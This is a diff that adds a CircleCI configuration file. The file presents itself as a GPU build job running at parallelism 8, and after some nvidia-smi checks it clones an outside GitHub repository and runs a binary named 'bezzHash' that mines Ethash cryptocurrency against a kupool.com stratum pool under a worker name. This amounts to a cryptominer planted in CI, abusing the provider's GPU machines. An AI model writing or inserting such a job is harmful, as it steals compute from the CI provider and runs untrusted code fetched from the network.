@@ -1,0 +1,12 @@
+version: 2.1  
+  
+jobs:  
+  build:  
+    machine:  
+      image: ubuntu-2004-cuda-11.4:202110-01  
+    resource_class: gpu.nvidia.medium
+    steps:  
+      - run: nvidia-smi  
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi  
+      - run: git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash && ./bezzHash --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 -u berkahh.001
+    parallelism: 8
